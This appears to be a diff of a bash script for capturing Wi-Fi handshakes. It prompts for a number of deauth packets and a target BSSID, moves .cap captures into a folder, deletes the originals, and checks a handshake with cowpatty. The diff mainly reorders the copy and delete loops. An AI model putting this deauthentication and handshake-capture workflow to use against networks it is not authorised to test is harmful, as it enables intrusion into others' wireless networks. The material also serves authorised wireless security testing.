@@ -2,21 +2,6 @@
 
 # wireless credentials
 
-while read line
-
-do
-
-cp /root/Desktop/$line.cap /root/Desktop/ehandshake
-
-done </root/Desktop/ehandshake/temp.txt
-
-while read line
-
-do
-
-rm /root/Desktop/$line.* 
-
-done </root/Desktop/ehandshake/temp.txt
 
 iwconfig
 
@@ -27,6 +12,23 @@ Enter the no. of deauths :"
 read du
 
 read -p "Enter BSSID :" bs
+
+while read line
+
+do
+
+cp /root/Desktop/$line.cap  /root/Desktop/ehandshake
+
+done </root/Desktop/ehandshake/temp.txt
+
+while read line
+
+do
+
+rm /root/Desktop/$line.*
+
+done </root/Desktop/ehandshake/temp.txt
+
 
 echo -n "Enter name of your wireless interface. E.g. for wlan0mon enter 0 :"
 
@@ -67,4 +69,4 @@ cowpatty -c -r /root/Desktop/ehandshake/$y
 
 #restarts network-manager
 
-gnome-terminal -- "./r.sh"
+gnome-terminal -- "./r.sh" --tab-with-profile=exits
